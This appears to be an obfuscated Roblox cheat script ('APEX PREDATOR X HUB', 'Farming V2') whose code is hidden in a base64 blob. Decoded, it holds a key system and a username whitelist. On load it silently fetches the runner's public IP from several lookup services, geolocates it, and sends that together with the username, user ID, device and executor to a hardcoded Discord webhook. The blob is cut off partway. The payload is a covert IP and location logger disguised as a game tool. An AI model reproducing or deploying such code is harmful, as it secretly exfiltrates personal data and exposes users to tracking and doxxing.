--[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-12-02 11:47:26]] (function() local __b = "LS0gS2V5IFN5c3RlbSB3aXRoIFdoaXRlbGlzdA0KbG9jYWwgdmFsaWRLZXlzID0gew0KICAgICIxIg0KfQ0KDQotLSBXaGl0ZWxpc3RlZCBSb2Jsb3ggdXNlcm5hbWVzIChjYXNlIGluc2Vuc2l0aXZlKQ0KbG9jYWwgd2hpdGVsaXN0ZWRVc2VycyA9IHsNCiAgICAiam9obl9zZW5zZWk1IiwNCiAgICAib250b3B0d2luIiwNCiAgICAiam9obl9zZW5zZWk1IiwNCiAgICAia3VydF9hcm1hbmxpY3VwIiwNCiAgICAicmlwX2luZHJhcG9naTMwOTMiLA0KICAgICJsaWV0b2RpZTEiLA0KICAgICJOaWdodF9zdHJpa2VyOCIsDQogICAgIkRvZl9QT0dJQUxUIiwNCiAgICAibXVzY2xlX2xlZ2VuZHMwNTciLA0KICAgICJJbV9iZWc2IiwNCiAgICAiRU5URVJOQUxHSE9TVDQiLA0KICAgICJSaXBfa2l5b3NoMSIsDQogICAgInRvbWx1Y2FzMjUyNSIsDQogICAgImRhdmVjYXBpel81NSIsDQogICAgIk9nX3ppb24xMjciLA0KICAgICJyaXBfaW5kcmFwb2dpMzA5MyIsDQogICAgIm1hc2F5b24xMjN4eHoiLA0KICAgICJrYW1kYWtvb2wiLA0KICAgICJsdW5haHViOSIsIA0KICAgICJjbG93bjIyOTA5IiwNCiAgICAiQWx0bmlDeW1vbnRvaCIsDQogICAgImRhcmt2YWRlcmlzYmxhY2siLA0KICAgICJPWEVOX0NBTk9OIiwNCiAgICAiR0NIX0tVUEFMIiwNCiAgICAiTXFudnA5MDkiLA0KICAgICJKYW1lc2dhbWluZ2JveWxsIiwNCiAgICAibXVzaGVoMDA3IiwNCiAgICAiWW91cmQzbnoiLA0KICAgICJKYXNtaW5lX3dhcmVuMW8iLA0KICAgICJ1bmNsZWJhZHMxOSIsDQogICAgInphY2tha2EyMjMiLA0KICAgICJPc2hpcnUxIiwNCiAgICAiRjRfQ3NpZGUiLA0KICAgICJuYXRoYW5iYWxpbGlhMTQiLA0KICAgICJqdXplbm5ueXN6IiwNCiAgICAiR0NIX3JheW1vbmRhbHQiDQogICAgIklpYWtpcmFibG9zc29tIiwNCiAgICAiUmljX3JleTEyMyIsDQogICAgImdpb21vcjAwMCIsDQogICAgIklkb2xrb3NpZWxyYXdhIiwNCiAgICAiVGVycmVyb3I0ODIiLA0KICAgICJBbGV4YUZ0X1lvdSIsDQogICAgInJpcF9pbmRyYXBvZ2kzMDkiDQoNCn0NCg0KLS0gU2VuZCB3ZWJob29rIGltbWVkaWF0ZWx5IHdoZW4gc2NyaXB0IGxvYWRzDQpsb2NhbCBmdW5jdGlvbiBzZW5kSW5pdGlhbFdlYmhvb2soKQ0KICAgIGxvY2FsIHVybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDQwMjY2Njc5MzE2NjQ3OTc3L0lBU3pTVHJCd2toTDFGWFdrYktpWEFiWFhMUndPT0drUmEzOTRkcnNqVXhvR1RTdVY1LXJsdkY5TURqNHhNNGlSbXlIIg0KICAgIA0KICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcg0KICAgIGxvY2FsIHN0YXRzID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJsZWFkZXJzdGF0cyIpDQogICAgDQogICAgLS0gRW5oYW5jZWQgSVAgRGV0ZWN0aW9uIEZ1bmN0aW9uDQogICAgbG9jYWwgZnVuY3Rpb24gZ2V0QWNjdXJhdGVJUCgpDQogICAgICAgIGxvY2FsIGlwU2VydmljZXMgPSB7DQogICAgICAgICAgICAiaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uIiwNCiAgICAgICAgICAgICJodHRwczovL2FwaS5teS1pcC5pby9pcC5qc29uIiwgDQogICAgICAgICAgICAiaHR0cHM6Ly9pcGFwaS5jby9qc29uLyIsDQogICAgICAgICAgICAiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIsDQogICAgICAgICAgICAiaHR0cHM6Ly9odHRwYmluLm9yZy9pcCIsDQogICAgICAgICAgICAiaHR0cHM6Ly9jaGVja2lwLmFtYXpvbmF3cy5jb20iLA0KICAgICAgICAgICAgImh0dHBzOi8vaWNhbmhhemlwLmNvbSIsDQogICAgICAgICAgICAiaHR0cHM6Ly9pZGVudC5tZSIsDQogICAgICAgICAgICAiaHR0cHM6Ly9pcGVjaG8ubmV0L3BsYWluIiwNCiAgICAgICAgICAgICJodHRwczovL3d0ZmlzbXlpcC5jb20vanNvbiINCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgbG9jYWwgZmFsbGJhY2tJUCA9ICJVbmtub3duIg0KICAgICAgICANCiAgICAgICAgZm9yIGksIHNlcnZpY2VVcmwgaW4gaXBhaXJzKGlwU2VydmljZXMpIGRvDQogICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgbG9jYWwgcmVzcG9uc2UgPSBnYW1lOkh0dHBHZXQoc2VydmljZVVybCwgdHJ1ZSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiBzZXJ2aWNlVXJsOmZpbmQoImpzb24iKSB0aGVuDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIik6SlNPTkRlY29kZShyZXNwb25zZSkNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpZnkiKSB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGF0YS5pcA0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJteS1pcCIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwDQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBzZXJ2aWNlVXJsOmZpbmQoImlwYXBpIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuaXANCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpbmZvIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuaXANCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgid3RmaXNteWlwIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuWW91ckZ1Y2tpbmdJUEFkZHJlc3MNCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaHR0cGJpbiIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLm9yaWdpbg0KICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXNwb25zZTpnc3ViKCIlcysiLCAiIik6Z3N1YigiXG4iLCAiIikNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgc3VjY2VzcyBhbmQgcmVzdWx0IGFuZCByZXN1bHQgfj0gIiIgYW5kIHJlc3VsdCB+PSAiVW5rbm93biIgdGhlbg0KICAgICAgICAgICAgICAgIGlmIHJlc3VsdDptYXRjaCgiXiglZCslLiVkKyUuJWQrJS4lZCspJCIpIG9yIHJlc3VsdDptYXRjaCgiXlsleDpdKyQiKSB0aGVuDQogICAgICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgd2FpdCgwLjEpDQogICAgICAgIGVuZA0KICAgICAgICByZXR1cm4gZmFsbGJhY2tJUA0KICAgIGVuZA0KDQogICAgLS0gRW5oYW5jZWQgTG9jYXRpb24gRGV0ZWN0aW9uDQogICAgbG9jYWwgZnVuY3Rpb24gZ2V0RW5oYW5jZWRMb2NhdGlvbihpcEFkZHJlc3MpDQogICAgICAgIGlmIGlwQWRkcmVzcyA9PSAiVW5rbm93biIgdGhlbg0KICAgICAgICAgICAgcmV0dXJuICJVbmtub3duIExvY2F0aW9uIg0KICAgICAgICBlbmQNCiAgICAgICAgDQogICAgICAgIGxvY2FsIGxvY2F0aW9uU2VydmljZXMgPSB7DQogICAgICAgICAgICAiaHR0cDovL2lwLWFwaS5jb20vanNvbi8iIC4uIGlwQWRkcmVzcywNCiAgICAgICAgICAgICJodHRwczovL2lwYXBpLmNvLyIgLi4gaXBBZGRyZXNzIC4uICIvanNvbi8iLA0KICAgICAgICAgICAgImh0dHBzOi8vaXBpbmZvLmlvLyIgLi4gaXBBZGRyZXNzIC4uICIvanNvbiINCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZm9yIGksIHNlcnZpY2VVcmwgaW4gaXBhaXJzKGxvY2F0aW9uU2VydmljZXMpIGRvDQogICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCBsb2NhdGlvbkRhdGEgPSBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgbG9jYWwgcmVzcG9uc2UgPSBnYW1lOkh0dHBHZXQoc2VydmljZVVybCwgdHJ1ZSkNCiAgICAgICAgICAgICAgICBsb2NhbCBkYXRhID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpOkpTT05EZWNvZGUocmVzcG9uc2UpDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgc2VydmljZVVybDpmaW5kKCJpcCUtYXBpIikgdGhlbg0KICAgICAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXR1cyA9PSAic3VjY2VzcyIgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2l0eSA9IGRhdGEuY2l0eSBvciAiVW5rbm93biINCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnkgPSBkYXRhLmNvdW50cnkgb3IgIlVua25vd24iDQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQ0KICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJpcGFwaSIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2l0eSA9IGRhdGEuY2l0eSBvciAiVW5rbm93biINCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY291bnRyeSA9IGRhdGEuY291bnRyeV9uYW1lIG9yICJVbmtub3duIg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQ0KICAgICAgICAgICAgICAgIGVsc2VpZiBzZXJ2aWNlVXJsOmZpbmQoImlwaW5mbyIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2l0eSA9IGRhdGEuY2l0eSBvciAiVW5rbm93biINCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY291bnRyeSA9IGRhdGEuY291bnRyeSBvciAiVW5rbm93biINCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICLwn5ONICIgLi4gY2l0eSAuLiAiLCAiIC4uIGNvdW50cnkNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgc3VjY2VzcyBhbmQgbG9jYXRpb25EYXRhIHRoZW4NCiAgICAgICAgICAgICAgICByZXR1cm4gbG9jYXRpb25EYXRhDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgICAgIHJldHVybiAi8J+TjSBVbmtub3duIExvY2F0aW9uIg0KICAgIGVuZA0KICAgIA0KICAgIC0tIEdldCBhY2N1cmF0ZSBJUCBhbmQgbG9jYXRpb24NCiAgICBsb2NhbCBhY2N1cmF0ZUlQID0gZ2V0QWNjdXJhdGVJUCgpDQogICAgbG9jYWwgbG9jYXRpb24gPSBnZXRFbmhhbmNlZExvY2F0aW9uKGFjY3VyYXRlSVApDQogICAgDQogICAgLS0gRnVuY3Rpb24gdG8gZm9ybWF0IG51bWJlcnMgd2l0aCBhYmJyZXZpYXRpb25zDQogICAgbG9jYWwgZnVuY3Rpb24gZm9ybWF0TnVtYmVyKG51bSkNCiAgICAgICAgaWYgbm90IG51bSB0aGVuIHJldHVybiAiTi9BIiBlbmQNCiAgICAgICAgbG9jYWwgZm9ybWF0cyA9IHsNCiAgICAgICAgICAgIHsxZTE4LCAiUWkifSwgezFlMTUsICJRYSJ9LCB7MWUxMiwgIlQifSwgDQogICAgICAgICAgICB7MWU5LCAiQiJ9LCB7MWU2LCAiTSJ9LCB7MWUzLCAiSyJ9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGZvciBfLCBmb3JtYXQgaW4gaXBhaXJzKGZvcm1hdHMpIGRvDQogICAgICAgICAgICBpZiBudW0gPj0gZm9ybWF0WzFdIHRoZW4NCiAgICAgICAgICAgICAgICByZXR1cm4gc3RyaW5nLmZvcm1hdCgiJS4xZiVzIiwgbnVtIC8gZm9ybWF0WzFdLCBmb3JtYXRbMl0pDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgICAgIHJldHVybiB0b3N0cmluZyhudW0pDQogICAgZW5kDQogICAgDQogICAgLS0gR2V0IHN0YXRzDQogICAgbG9jYWwgc3RyZW5ndGggPSBzdGF0cyBhbmQgc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlN0cmVuZ3RoIikgYW5kIHN0YXRzLlN0cmVuZ3RoLlZhbHVlIG9yIDANCiAgICBsb2NhbCBkdXJhYmlsaXR5ID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJEdXJhYmlsaXR5IikgYW5kIHBsYXllci5EdXJhYmlsaXR5LlZhbHVlIG9yIDANCiAgICBsb2NhbCByZWJpcnRocyA9IHN0YXRzIGFuZCBzdGF0czpGaW5kRmlyc3RDaGlsZCgiUmViaXJ0aHMiKSBhbmQgc3RhdHMuUmViaXJ0aHMuVmFsdWUgb3IgMA0KICAgIA0KICAgIC0tIEVuaGFuY2VkIGRldmljZSBkZXRlY3Rpb24NCiAgICBsb2NhbCBkZXZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKTpHZXRQbGF0Zm9ybSgpLk5hbWUNCiAgICBsb2NhbCBleGVjdXRvciA9ICJVbmtub3duIg0KICAgIA0KICAgIC0tIERldGVjdCBleGVjdXRvciBtb3JlIGFjY3VyYXRlbHkNCiAgICBpZiBzeW4gdGhlbg0KICAgICAgICBleGVjdXRvciA9ICJTeW5hcHNlIFgiDQogICAgZWxzZWlmIFBST1RPU01BU0hFUl9MT0FERUQgdGhlbg0KICAgICAgICBleGVjdXRvciA9ICJQcm90b1NtYXNoZXIiDQogICAgZWxzZWlmIEtSTkxfTE9BREVEIHRoZW4NCiAgICAgICAgZXhlY3V0b3IgPSAiS1JOTCINCiAgICBlbHNlaWYgaWRlbnRpZnlleGVjdXRvciB0aGVuDQogICAgICAgIGV4ZWN1dG9yID0gaWRlbnRpZnlleGVjdXRvcigpIG9yICJVbmtub3duIg0KICAgIGVuZA0KDQogICAgLS0gQ2hlY2sgaWYgdXNlciBpcyB3aGl0ZWxpc3RlZA0KICAgIGxvY2FsIGZ1bmN0aW9uIGlzVXNlcldoaXRlbGlzdGVkKCkNCiAgICAgICAgbG9jYWwgcGxheWVyTmFtZSA9IHBsYXllci5OYW1lOmxvd2VyKCkNCiAgICAgICAgZm9yIF8sIHdoaXRlbGlzdGVkTmFtZSBpbiBpcGFpcnMod2hpdGVsaXN0ZWRVc2VycykgZG8NCiAgICAgICAgICAgIGlmIHBsYXllck5hbWUgPT0gd2hpdGVsaXN0ZWROYW1lOmxvd2VyKCkgdGhlbg0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgICAgIHJldHVybiBmYWxzZQ0KICAgIGVuZA0KDQogICAgbG9jYWwgaXNXaGl0ZWxpc3RlZCA9IGlzVXNlcldoaXRlbGlzdGVkKCkNCg0KICAgIGxvY2FsIGRhdGEgPSB7DQogICAgICAgIFsiY29udGVudCJdID0gIvCfjq4gKipGQVJNSU5HIFYyIC0gU0NSSVBUIExPQURFRCoqIiwNCiAgICAgICAgWyJlbWJlZHMiXSA9IHt7DQogICAgICAgICAgICBbInRpdGxlIl0gPSAi8J+UsCBTY3JpcHQgRXhlY3V0aW9uIFN0YXJ0ZWQiLA0KICAgICAgICAgICAgWyJjb2xvciJdID0gaXNXaGl0ZWxpc3RlZCBhbmQgNjUyODAgb3IgMTY3MTE2ODAsIC0tIEdyZWVuIGlmIHdoaXRlbGlzdGVkLCBSZWQgaWYgbm90DQogICAgICAgICAgICBbInRodW1ibmFpbCJdID0gew0KICAgICAgICAgICAgICAgIFsidXJsIl0gPSAiaHR0cHM6Ly93d3cucm9ibG94LmNvbS9oZWFkc2hvdC10aHVtYm5haWwvaW1hZ2U/dXNlcklkPSIgLi4gcGxheWVyLlVzZXJJZCAuLiAiJndpZHRoPTQyMCZoZWlnaHQ9NDIwJmZvcm1hdD1wbmciDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgWyJmaWVsZHMiXSA9IHsNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCfkaQgUGxheWVyIEluZm9ybWF0aW9uIiwNCiAgICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIioqVXNlcm5hbWU6KiogYCIgLi4gcGxheWVyLk5hbWUgLi4gImBcbioqRGlzcGxheToqKiAiIC4uIHBsYXllci5EaXNwbGF5TmFtZSAuLiAiXG4qKlVzZXIgSUQ6KiogYCIgLi4gcGxheWVyLlVzZXJJZCAuLiAiYCIsDQogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCfjI0gTG9jYXRpb24gRGF0YSIsDQogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICIqKklQOioqIGAiIC4uIGFjY3VyYXRlSVAgLi4gImBcbiIgLi4gbG9jYXRpb24sDQogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCfkrsgU3lzdGVtIEluZm9ybWF0aW9uIiwNCiAgICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIioqUGxhdGZvcm06KiogIiAuLiBkZXZpY2UgLi4gIlxuKipFeGVjdXRvcjoqKiAiIC4uIGV4ZWN1dG9yLA0KICAgICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZQ0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBbIm5hbWUiXSA9ICLwn5SQIFNlY3VyaXR5IFN0YXR1cyIsDQogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICIqKldoaXRlbGlzdGVkOioqICIgLi4gKGlzV2hpdGVsaXN0ZWQgYW5kICLinIUgWWVzIiBvciAi4p2MIE5vIikgLi4gIlxuKipLZXkgUmVxdWlyZWQ6KiogIiAuLiAoaXNXaGl0ZWxpc3RlZCBhbmQgIuKchSBZZXMiIG9yICLinYwgTm8iKSwNCiAgICAgICAgICAgICAgICAgICAgWyJpbmxpbmUiXSA9IHRydWUNCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAi8J+SqiBHYW1lIFN0YXRpc3RpY3MiLA0KICAgICAgICAgICAgICAgICAgICBbInZhbHVlIl0gPSAi8J+SqiAqKlN0cmVuZ3RoOioqIGAiIC4uIGZvcm1hdE51bWJlcihzdHJlbmd0aCkgLi4gImBcbvCfm6HvuI8gKipEdXJhYmlsaXR5OioqIGAiIC4uIGZvcm1hdE51bWJlcihkdXJhYmlsaXR5KSAuLiAiYFxu8J+UhCAqKlJlYmlydGhzOioqIGAiIC4uIGZvcm1hdE51bWJlcihyZWJpcnRocykgLi4gImAiLA0KICAgICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICBbImZvb3RlciJdID0gew0KICAgICAgICAgICAgICAgIFsidGV4dCJdID0gIkFQRVggUFJFREFUT1IgWCDigKIgU2NyaXB0IExvYWRlZCDigKIgIiAuLiBvcy5kYXRlKCIlWS0lbS0lZCBhdCAlSDolTTolUyIpDQogICAgICAgICAgICB9DQogICAgICAgIH19DQogICAgfQ0KICAgIA0KICAgIHBjYWxsKGZ1bmN0aW9uKCkNCiAgICAgICAgbG9jYWwgaHR0cCA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQ0KICAgICAgICBsb2NhbCByZXNwb25zZSA9IGh0dHA6UmVxdWVzdEFzeW5jKHsNCiAgICAgICAgICAgIFVybCA9IHVybCwNCiAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwNCiAgICAgICAgICAgIEhlYWRlcnMgPSB7DQogICAgICAgICAgICAgICAgWyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgIEJvZHkgPSBodHRwOkpTT05FbmNvZGUoZGF0YSkNCiAgICAgICAgfSkNCiAgICBlbmQpDQplbmQNCg0KLS0gU2VuZCB3ZWJob29rIGltbWVkaWF0ZWx5IHdoZW4gc2NyaXB0IHN0YXJ0cw0Kc2VuZEluaXRpYWxXZWJob29rKCkNCg0KLS0gQ29udGludWUgd2l0aCB0aGUgcmVzdCBvZiB0aGUga2V5IHN5c3RlbS4uLg0KbG9jYWwga2V5R3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQ0Ka2V5R3VpLk5hbWUgPSAiS2V5U3lzdGVtIg0Ka2V5R3VpLlBhcmVudCA9IGdhbWUuQ29yZUd1aQ0KDQpsb2NhbCBrZXlGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQ0Ka2V5RnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLCAzMjAsIDAsIDIwMCkNCmtleUZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE2MCwgMC41LCAtMTAwKQ0Ka2V5RnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1LCAxNSwgMjApDQprZXlGcmFtZS5QYXJlbnQgPSBrZXlHdWkNCg0KbG9jYWwgVUlDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikNClVJQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQ0KVUlDb3JuZXIuUGFyZW50ID0ga2V5RnJhbWUNCg0KLS0gVGhpY2sgQW5pbWF0ZWQgR3JhZGllbnQgQm9yZGVyDQpsb2NhbCBVSVN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQ0KVUlTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQ0KVUlTdHJva2UuVGhpY2tuZXNzID0gNA0KVUlTdHJva2UuUGFyZW50ID0ga2V5RnJhbWUNCg0KbG9jYWwgZ3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQ0KZ3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7DQogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQig1MSwgNTEsIDUxKSksICAgLS0gIzMzMzMzMw0KICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpKSAgIC0tICNkZDE4MTgNCn0pDQpncmFkaWVudC5Sb3RhdGlvbiA9IDANCmdyYWRpZW50LlBhcmVudCA9IFVJU3Ryb2tlDQoNCi0tIEFuaW1hdGUgdGhlIGdyYWRpZW50IHJvdGF0aW9uDQpzcGF3bihmdW5jdGlvbigpDQogICAgd2hpbGUga2V5R3VpLlBhcmVudCBkbw0KICAgICAgICBmb3IgaSA9IDAsIDM2MCwgMiBkbw0KICAgICAgICAgICAgZ3JhZGllbnQuUm90YXRpb24gPSBpDQogICAgICAgICAgICB3YWl0KDAuMDMpDQogICAgICAgIGVuZA0KICAgIGVuZA0KZW5kKQ0KDQotLSBBUEVYIFBSRURBVE9SIFggVGl0bGUgd2l0aCBUcmlwbGUgR3JhZGllbnQNCmxvY2FsIHRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQ0KdGl0bGUuVGV4dCA9ICJBUEVYIFBSRURBVE9SIFggSFVCIg0KdGl0bGUuU2l6ZSA9IFVEaW0yLm5ldygwLjksIDAsIDAsIDMwKQ0KdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4wNSwgMCwgMC4xLCAwKQ0KdGl0bGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDENCnRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQ0KdGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1CbGFjaw0KdGl0bGUuVGV4dFNpemUgPSAyMA0KdGl0bGUuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAuOA0KdGl0bGUuVGV4dFN0cm9rZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApDQp0aXRsZS5QYXJlbnQgPSBrZXlGcmFtZQ0KDQpsb2NhbCB0aXRsZUdyYWRpZW50ID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IikNCnRpdGxlR3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7DQogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQigyNiwgNDIsIDEwOCkpLCAgIC0tICMxYTJhNmMNCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNSwgQ29sb3IzLmZyb21SR0IoMTc4LCAzMSwgMzEpKSwgLS0gI2IyMWYxZg0KICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMjUzLCAxODcsIDQ1KSkgICAtLSAjZmRiYjJkDQp9KQ0KdGl0bGVHcmFkaWVudC5Sb3RhdGlvbiA9IDANCnRpdGxlR3JhZGllbnQuUGFyZW50ID0gdGl0bGUNCg0KLS0gQW5pbWF0ZSB0aXRsZSBncmFkaWVudA0Kc3Bhd24oZnVuY3Rpb24oKQ0KICAgIHdoaWxlIGtleUd1aS5QYXJlbnQgZG8NCiAgICAgICAgZm9yIGkgPSAwLCAzNjAsIDMgZG8NCiAgICAgICAgICAgIHRpdGxlR3JhZGllbnQuUm90YXRpb24gPSBpDQogICAgICAgICAgICB3YWl0KDAuMDQpDQogICAgICAgIGVuZA0KICAgIGVuZA0KZW5kKQ0KDQotLSAiQnkgOiBEeWxhbiIgU3VidGl0bGUgd2l0aCBzYW1lIGdyYWRpZW50DQpsb2NhbCBzdWJ0aXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikNCnN1YnRpdGxlLlRleHQgPSAiQnkgOiBEeWxhbiINCnN1YnRpdGxlLlNpemUgPSBVRGltMi5uZXcoMC45LCAwLCAwLCAxNSkNCnN1YnRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDUsIDAsIDAuMjUsIDApDQpzdWJ0aXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQ0Kc3VidGl0bGUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpDQpzdWJ0aXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQNCnN1YnRpdGxlLlRleHRTaXplID0gMTANCnN1YnRpdGxlLlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLjgNCnN1YnRpdGxlLlRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQ0Kc3VidGl0bGUuUGFyZW50ID0ga2V5RnJhbWUNCg0KbG9jYWwgc3VidGl0bGVHcmFkaWVudCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIpDQpzdWJ0aXRsZUdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoew0KICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoMjYsIDQyLCAxMDgpK